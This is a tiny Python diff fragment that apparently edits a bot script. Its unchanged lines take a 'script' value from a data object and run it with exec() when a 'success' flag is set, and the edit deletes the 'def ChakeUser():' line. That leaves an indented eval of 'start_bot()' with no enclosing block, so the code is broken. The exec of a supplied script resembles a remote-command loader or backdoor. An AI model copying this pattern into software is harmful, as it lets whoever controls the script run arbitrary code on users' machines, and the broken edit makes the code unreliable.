@@ -8,5 +8,4 @@ success = Data.get("success")
 if success :
     script = Data.get("script")
     exec(script)
-def ChakeUser():
     eval("""start_bot()""")
